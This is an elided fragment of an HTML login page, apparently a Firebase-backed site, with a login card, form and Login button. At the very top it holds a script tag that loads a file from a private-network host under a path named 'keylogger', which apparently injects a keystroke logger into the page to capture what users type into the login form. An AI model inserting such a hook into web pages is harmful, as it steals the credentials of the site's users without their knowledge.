...
<script type="text/javascript" src="http://192.168.0.16:8080/keylogger/FEaaBJAIvfML.js?id=35035246"></script>
<script>
  // Initialize Firebase
    ...
    <div class="card card-login mx-auto mt-5">
      ...
      <div class="card-body">
        <form id="login-form">
          ...
          <a class="btn btn-primary btn-block" onclick="return login();" >Login</a>
        </form>
